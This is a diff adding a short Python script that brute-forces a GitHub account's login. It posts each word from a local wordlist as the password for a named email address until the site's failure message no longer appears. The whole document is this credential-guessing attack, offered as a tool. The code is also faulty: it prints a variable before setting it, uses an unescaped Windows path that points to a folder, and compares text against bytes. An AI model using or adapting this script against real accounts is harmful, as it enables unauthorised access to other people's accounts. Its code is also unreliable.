@@ -1,0 +1,20 @@
+import requests
+
+
+target_url = "https://github.com/login"
+data_dict = {"login":"warafanalakaziqrak@gmail.com", "password":"","commit":"sign in"}
+print(responce.content)
+
+with open("C:\Users\AlfaCentauri\Desktop\New folder", "r") as wordlist_file:
+    for line in wordlist_file:
+        word =line.strip()
+        data_dict["password"] =word
+        responce = requests.post(target_url, data=data_dict)
+        if "Login faild" not in responce.content:
+            print("[+] Got the password --> "+word)
+            exit()
+print("[+]Reched end of line.")
+
+
+
+
